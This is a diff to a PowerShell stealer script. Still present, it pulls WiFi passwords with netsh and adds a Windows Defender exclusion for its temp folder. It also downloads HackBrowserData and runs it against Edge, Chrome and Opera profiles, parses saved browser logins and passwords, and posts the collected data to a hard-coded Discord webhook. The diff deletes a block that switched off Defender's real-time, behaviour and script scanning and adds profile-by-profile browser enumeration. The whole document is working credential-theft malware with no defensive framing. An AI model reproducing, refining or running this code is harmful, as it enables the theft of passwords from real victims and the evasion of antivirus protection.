@@ -4,17 +4,6 @@ $webhook = "https://discord.com/api/webhooks/1467247480428171385/TSirVX8AGKGeYAO
 # Get PC info
 $pc = "$env:COMPUTERNAME | $env:USERNAME"
 
-# === Disable Windows Defender temporarily ===
-try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
-} catch {
-    # Continue if already disabled or no permissions
-}
-
 # === WiFi Passwords ===
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
 $wifi = ""
@@ -36,9 +25,9 @@ try {
     # Add temp directory to Windows Defender exclusion
     Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
     
-    # Download newer HackBrowserData version with Windows 11 support
-$hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
-$zipPath = "$tempDir\hbd.zip"
+    # Download HackBrowserData
+    $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
+    $zipPath = "$tempDir\hbd.zip"
     
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $hbdUrl -OutFile $zipPath -UseBasicParsing
@@ -47,66 +36,102 @@ $zipPath = "$tempDir\hbd.zip"
     Add-Type -AssemblyName System.IO.Compression.FileSystem
     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
     
-    # Force close browsers before extraction
-    taskkill /f /im chrome.exe /im firefox.exe /im msedge.exe /im opera.exe /im brave.exe 2>$null
-    Start-Sleep -Seconds 3
-    
-    # Try running as current user first
+    # Run HackBrowserData
     $exePath = "$tempDir\hack-browser-data.exe"
     if(Test-Path $exePath) {
-        # Run with verbose output and check all browser types
-        $process = Start-Process -FilePath $exePath -ArgumentList "-b chrome,firefox,edge,opera,brave -f json --dir $tempDir -vv" -WindowStyle Normal -Wait -PassThru
-        $exitCode = $process.ExitCode
-        Start-Sleep -Seconds 10
+        $browsers = "Debug Info:`n"
         
-        # Debug: List all files in temp directory
-        $allFiles = Get-ChildItem -Path $tempDir -Recurse
-        $debugInfo = "Files found: " + ($allFiles.Count) + " Exit code: $exitCode`n"
-        foreach($file in $allFiles) {
-            $debugInfo += $file.Name + "`n"
-        }
+        # Search for browser data directories
+        $localAppData = $env:LOCALAPPDATA
+        $appData = $env:APPDATA
         
-        # Debug: Check common browser data paths
-        $paths = @()
-        $paths += "Chrome: " + (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")
-        $paths += "Firefox: " + (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles")
-        $paths += "Edge: " + (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data")
-        $debugInfo += "Browser paths: " + ($paths -join ", ")
+        # Check all User Data folders
+        $edgePaths = @(
+            "$localAppData\Microsoft\Edge\User Data"
+            "$localAppData\Microsoft\Edge SxS\User Data"
+        )
         
-        # Read the password file
-        $jsonFile = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse | Select-Object -First 1
-        if($jsonFile) {
-            $data = Get-Content $jsonFile.FullName | ConvertFrom-Json
-            $browsers = ""
-            foreach($item in $data) {
-                $url = if($item.LoginURL) { $item.LoginURL } else { "No URL" }
-                $user = if($item.UserName) { $item.UserName } else { "" }
-                $pass = if($item.Password) { $item.Password } else { "" }
-                
-                if($pass) {
-                    $browsers += "$url`nUser: $user`nPass: $pass`n`n"
+        $chromePaths = @(
+            "$localAppData\Google\Chrome\User Data"
+            "$localAppData\Chromium\User Data"
+        )
+        
+        $operaPaths = @(
+            "$appData\Opera Software\Opera Stable"
+            "$appData\Opera Software\Opera GX Stable"
+        )
+        
+        $browsers += "Searching for browsers...`n"
+        
+        # Find Edge profiles
+        foreach($basePath in $edgePaths) {
+            if(Test-Path $basePath) {
+                $profiles = Get-ChildItem -Path $basePath -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
+                foreach($profile in $profiles) {
+                    $browsers += "Found Edge: " + $profile.FullName + "`n"
+                    & $exePath -b edge -p $profile.FullName -f json --dir $tempDir 2>&1 | Out-Null
                 }
             }
-            if(-not $browsers) { $browsers = "No saved browser passwords found" }
-        } else {
-            $browsers = "No password data extracted. Debug info: $debugInfo"
+        }
+        
+        # Find Chrome profiles
+        foreach($basePath in $chromePaths) {
+            if(Test-Path $basePath) {
+                $profiles = Get-ChildItem -Path $basePath -Directory | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
+                foreach($profile in $profiles) {
+                    $browsers += "Found Chrome: " + $profile.FullName + "`n"
+                    & $exePath -b chrome -p $profile.FullName -f json --dir $tempDir 2>&1 | Out-Null
+                }
+            }
+        }
+        
+        # Find Opera profiles
+        foreach($operaPath in $operaPaths) {
+            if(Test-Path $operaPath) {
+                $browsers += "Found Opera: " + $operaPath + "`n"
+                & $exePath -b opera -p $operaPath -f json --dir $tempDir 2>&1 | Out-Null
+            }
+        }
+        
+        Start-Sleep -Seconds 5
+        
+        # List all files created
+        $allFiles = Get-ChildItem -Path $tempDir -Filter "*.json"
+        $browsers += "JSON files found: " + $allFiles.Count + "`n"
+        foreach($f in $allFiles) {
+            $browsers += "  - " + $f.Name + " (" + $f.Length + " bytes)`n"
+        }
+        
+        # Read ALL password JSON files and combine
+        $jsonFiles = Get-ChildItem -Path $tempDir -Filter "*password*.json" -Recurse
+        $passData = ""
+        
+        foreach($jsonFile in $jsonFiles) {
+            try {
+                $content = Get-Content $jsonFile.FullName -Raw
+                $data = $content | ConvertFrom-Json
+                foreach($item in $data) {
+                    $url = if($item.LoginURL) { $item.LoginURL } else { "No URL" }
+                    $user = if($item.UserName) { $item.UserName } else { "" }
+                    $pass = if($item.Password) { $item.Password } else { "" }
+                    
+                    if($pass) {
+                        $passData += "$url`nUser: $user`nPass: $pass`n`n"
+                    }
+                }
+            } catch {
+                $browsers += "Error reading " + $jsonFile.Name + ": " + $_.Exception.Message + "`n"
+            }
+        }
+        
+        if($passData) {
+            $browsers = $passData
         }
     } else {
         $browsers = "Failed to extract HackBrowserData"
     }
 } catch {
     $browsers = "Error: $($_.Exception.Message)"
-}
-
-# === Re-enable Windows Defender ===
-try {
-    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableScriptScanning $false -ErrorAction SilentlyContinue
-} catch {
-    # Continue if can't re-enable
 }
 
 # Clean up
@@ -137,6 +162,3 @@ if($output.Length -gt $maxLen) {
     $body = @{ content = $output } | ConvertTo-Json
     Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
 }
-
-# Auto-close PowerShell after sending
-exit
